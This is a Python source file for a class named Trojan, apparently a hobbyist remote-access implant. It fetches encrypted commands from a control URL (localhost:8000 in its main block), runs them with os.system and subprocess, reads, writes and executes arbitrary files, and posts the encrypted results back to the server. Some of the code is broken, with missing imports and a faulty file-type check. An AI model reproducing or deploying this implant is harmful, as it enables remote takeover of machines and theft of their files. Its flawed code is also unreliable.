import urllib.request as request
import urllib.parse as parse

import json
import os
import sys

sys.path.append("..")
from Encryptor import *


class Trojan:
    def __init__(self, commandurl,\
                useragent='Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5',\
                computerid = 'None', **headers):
        self.commandurl = commandurl
        self.useragent = useragent
        self.computerid = computerid
        self.headers = {'computer-id':'DHT-11', 'User-agent' : self.useragent}
        self.headers.update(headers) #concatenates two dictionaries
    
    def commands(self) -> dict:
        req = request.Request(self.commandurl, headers = self.headers)
        with request.urlopen(req) as response:
            encryptedresponse = response.read().decode()
        decryptedresponse = decrypt(encryptedresponse)
        commands = ''
        try:
            commands = json.loads(decryptedresponse)
        except JSONDecodeError:
            decryptedresponse = decryptedresponse.replace('\'', '"')
            commands = json.loads(decryptedresponse)
        return commands
    
    def sendoutcome(self, outcome: dict) -> str:
        print('in sendoutcome')
        data = parse.urlencode(encrypt(outcome)).encode('utf-8')
        req = request.Request(self.commandurl, data=data, headers = self.headers)
        with request.urlopen(req) as response:
            response = response.read().decode()
        return response
            
    def run(self):
        """
        |cmd- run commands from cmd- input is [*commands], output is [*outcome]
        |file-read- read a file from computer- input is [*files], output is [*[file name, content/error]]
        |file-write- write files to computer- input is [*[file name, file content]], output is [*[file name, errors]]
        |file-run- run files on computer- input is [*files], output is [*[file name, errors]]
        """
        commands = self.commands()
        print(commands)
        outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : []}
        print(commands)
        for key, values in commands.items():
            if key.lower() == 'cmd':
                for cmd in values: #just keeps running seemingly random values
                    output = os.system('cmd /c "%s"'% cmd) 
                    if output == -1 or output == 1:
                        try:
                            output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
                        except Exception as e:
                            output = e
                    outcomes['cmd'].append([ cmd, output])
            elif key.lower() == 'file-read':
                for value in values:
                    try:
                        with open(value, 'r') as file:
                            content = file.read()
                    except Exception as e:
                        content = e
                    outcomes['file-read'].append([value, content])
            elif key.lower() == 'file-write':
                for value in values:
                    errors = None
                    try:
                        with open(value[0], 'w') as file:
                            file.write(value[1])
                    except Exception as e:
                        errors = e
                    outcomes['file-write'].append([value[0], errors])
            elif key.lower() == 'file-run':
                for value in values:
                    filetype = value.split('.')[-1]
                    if filetype == '.py': filetype = 'python'
                    #add other filetype checks here
                    output = ''
                    if '.' not in filetype: #been converted correctly
                        try:
                            output +=subprocess.check_output(shlex.split('%s %s' %(filetype, value)), stderr=subprocess.STDOUT).decode()
                        except Exception as e:
                            output += str(e)
                    else:
                        output += '\n\n[*] Invalid file type\n\n'
                    outcomes['file-run'].append([value, output])
        self.sendoutcome(outcomes)
                    
                    
                    
                
            
if __name__ == '__main__':  
    trojan = Trojan('http://localhost:8000', computerid='dht-11')
    trojan.run()
